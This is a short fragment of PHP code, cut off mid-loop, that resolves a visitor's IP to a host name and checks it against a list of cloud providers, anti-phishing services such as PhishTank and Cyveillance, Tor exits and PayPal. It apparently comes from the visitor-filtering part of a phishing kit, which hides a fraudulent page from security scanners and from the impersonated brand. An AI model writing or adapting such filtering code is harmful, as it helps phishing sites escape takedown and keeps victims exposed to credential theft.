...
$Grey_Host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$Grey_Disable = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "paypal");
foreach($Grey_Disable as $sys) {
    if (substr_count($Grey_Host, $sys) > 0) {
